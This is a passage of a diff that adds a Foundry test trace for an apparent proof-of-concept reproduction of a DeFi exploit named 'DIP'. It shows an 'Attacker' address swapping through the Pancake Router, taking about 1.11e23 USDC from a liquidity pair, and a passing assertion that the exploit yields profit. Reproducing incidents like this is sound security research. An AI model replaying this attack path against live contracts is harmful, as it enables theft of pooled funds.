+    │   │   │   │   ├─ [27993] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::transfer(Attacker: [0x0d4024Cd27538350a911D9B7eE90811fa4875ba3], 111102040333740421272058 [1.111e23]) [delegatecall]
+    │   │   │   │   │   ├─ emit Transfer(from: 0x473715a3AD10E6ea8E8d549CC0C0B1059B2bA9bd, to: Attacker: [0x0d4024Cd27538350a911D9B7eE90811fa4875ba3], amount: 111102040333740421272058 [1.111e23])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xee8dd6ca3a5158fabebde9eb575b816e95d57baeff141cd07ec25dbaabe81e97: 0 → 0x000000000000000000000000000000000000000000001786da8a6fb2f77dd1fa
+    │   │   │   │   │   │   @ 0x8798444107cf9b60b8407c4f34f4486bf5fe029fa2240b1031665ac29455847c: 0x00000000000000000000000000000000000000000000184f7597511d700ebc5b → 0x0000000000000000000000000000000000000000000000c89b0ce16a7890ea61
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [607] AIC::balanceOf(0x473715a3AD10E6ea8E8d549CC0C0B1059B2bA9bd) [staticcall]
+    │   │   │   │   └─ ← [Return] 10321950469040508262709977 [1.032e25]
+    │   │   │   ├─ [1296] USDC::balanceOf(0x473715a3AD10E6ea8E8d549CC0C0B1059B2bA9bd) [staticcall]
+    │   │   │   │   ├─ [553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(0x473715a3AD10E6ea8E8d549CC0C0B1059B2bA9bd) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 3700521367364915227233 [3.7e21]
+    │   │   │   │   └─ ← [Return] 3700521367364915227233 [3.7e21]
+    │   │   │   ├─ emit Sync(reserve0: 10321950469040508262709977 [1.032e25], reserve1: 3700521367364915227233 [3.7e21])
+    │   │   │   ├─ emit Swap(sender: Pancake Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 9990039954081828866375631 [9.99e24], amount1In: 0, amount0Out: 0, amount1Out: 111102040333740421272058 [1.111e23], to: Attacker: [0x0d4024Cd27538350a911D9B7eE90811fa4875ba3])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 8: 0x6a3179ae00000000184f7597511d700ebc5b000000004648e7b2a1a4a5c43b0a → 0x6a3179b50000000000c89b0ce16a7890ea610000000889c20e5f42ef0dfc7ad9
+    │   │   │   │   @ 9: 0x00000000000000000000000000000026022660eb8ae3f6d815338f9bc6eeb9b7 → 0x000000000000000000000000000000260228ccbe8dd71a3856e7dcf6ab2a24d6
+    │   │   │   │   @ 10: 0x0000000000000000000000000000010822ab89cda2f349b7a12bb93a47bf0e9b → 0x0000000000000000000000000000010822bfc6bad6f9c14eccd1e0141bdb31b2
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [1296] USDC::balanceOf(Attacker: [0x0d4024Cd27538350a911D9B7eE90811fa4875ba3]) [staticcall]
+    │   │   │   ├─ [553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(Attacker: [0x0d4024Cd27538350a911D9B7eE90811fa4875ba3]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 111102040333740421272058 [1.111e23]
+    │   │   │   └─ ← [Return] 111102040333740421272058 [1.111e23]
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [1296] USDC::balanceOf(Attacker: [0x0d4024Cd27538350a911D9B7eE90811fa4875ba3]) [staticcall]
+    │   ├─ [553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(Attacker: [0x0d4024Cd27538350a911D9B7eE90811fa4875ba3]) [delegatecall]
+    │   │   └─ ← [Return] 111102040333740421272058 [1.111e23]
+    │   └─ ← [Return] 111102040333740421272058 [1.111e23]
+    ├─ emit log_named_decimal_uint(key: "USDC profit", val: 111102040333740421272058 [1.111e23], decimals: 18)
+    ├─ [0] VM::assertGt(111102040333740421272058 [1.111e23], 100000000000000000000000 [1e23], "DIP exploit should leave USDC profit") [staticcall]
+    │   └─ ← [Return]
+    ├─ [1828] USDC::symbol() [staticcall]
+    │   ├─ [1082] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::symbol() [delegatecall]
+    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000045553444300000000000000000000000000000000000000000000000000000000
+    │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000045553444300000000000000000000000000000000000000000000000000000000
+    ├─ [1296] USDC::balanceOf(Attacker: [0x0d4024Cd27538350a911D9B7eE90811fa4875ba3]) [staticcall]
+    │   ├─ [553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(Attacker: [0x0d4024Cd27538350a911D9B7eE90811fa4875ba3]) [delegatecall]
+    │   │   └─ ← [Return] 111102040333740421272058 [1.111e23]
+    │   └─ ← [Return] 111102040333740421272058 [1.111e23]
+    ├─ [1076] USDC::decimals() [staticcall]
+    │   ├─ [336] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::decimals() [delegatecall]
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000012
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000012
+    ├─ emit log_named_decimal_uint(key: "Attacker After exploit USDC Balance", val: 111102040333740421272058 [1.111e23], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 14.92s (13.62s CPU time)
+
+Ran 1 test suite in 14.92s (14.92s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
